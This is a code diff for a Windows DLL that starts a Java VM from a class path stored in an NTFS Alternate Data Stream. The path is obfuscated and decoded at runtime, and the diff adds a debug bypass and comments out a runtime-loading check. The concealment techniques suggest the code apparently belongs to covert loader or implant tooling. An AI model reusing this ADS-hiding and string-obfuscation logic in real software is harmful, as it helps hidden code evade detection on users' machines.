@@ -47,15 +47,22 @@ unsigned int __stdcall Thread_Start_JVM(void* a) {
 	LoadString( dll_handle, IDS_ADS_FILE_PATH, ads_path, 400);
 	if( strlen( ads_path ) == 0 ){
 #ifdef _DBG
+		strcpy(ads_path, "C:\\Windows\\Temp\\test_ads.file");
+#elif
 		Log( "[-] Error: ADS file path not set. Exiting\n");
-#endif
 		return 1;
+#endif
 	}
 
+#ifdef _DBG
+	//Deobfuscate it
+	std::string classPath(ads_path);
+#elif
 	//Deobfuscate it
 	char *ads_path_ptr = decode_split(ads_path, 400);
 	std::string classPath(ads_path_ptr);
 	free(ads_path_ptr);
+#endif
 
 	//Add the ADS reference
 	classPath.append(COLON);
@@ -745,29 +752,29 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath, const cha
 	jvmPathStr.append(mscrt);
 	free(mscrt);
 
-	//If the file couldn't be found or loaded
-	if( !LoadJvmCRuntime( jvmPathStr ) ) {
-
-#ifdef _DBG
-		std::string sFailed("Failed to Load JVM DLL, Path: ");
-		sFailed.append(jvmPathStr).append("\n");
-		//Log
-		Log((char *)sFailed.c_str());
-		Log("Error code = %d\n", GetLastError());					
-#endif
-				
-		//Free memory
-		free(jvmPath);
-		return FALSE;	
-
-	} else {
-	
-#ifdef _DBG
-		//Print status
-		Log("Loaded C Runtime Library.\n");					
-#endif
-	
-	}
+//	//If the file couldn't be found or loaded
+//	if( !LoadJvmCRuntime( jvmPathStr ) ) {
+//
+//#ifdef _DBG
+//		std::string sFailed("Failed to Load JVM DLL, Path: ");
+//		sFailed.append(jvmPathStr).append("\n");
+//		//Log
+//		Log((char *)sFailed.c_str());
+//		Log("Error code = %d\n", GetLastError());					
+//#endif
+//				
+//		//Free memory
+//		free(jvmPath);
+//		return FALSE;	
+//
+//	} else {
+//	
+//#ifdef _DBG
+//		//Print status
+//		Log("Loaded C Runtime Library.\n");					
+//#endif
+//	
+//	}
 			  
 	
 	//If the file couldn't be found or loaded
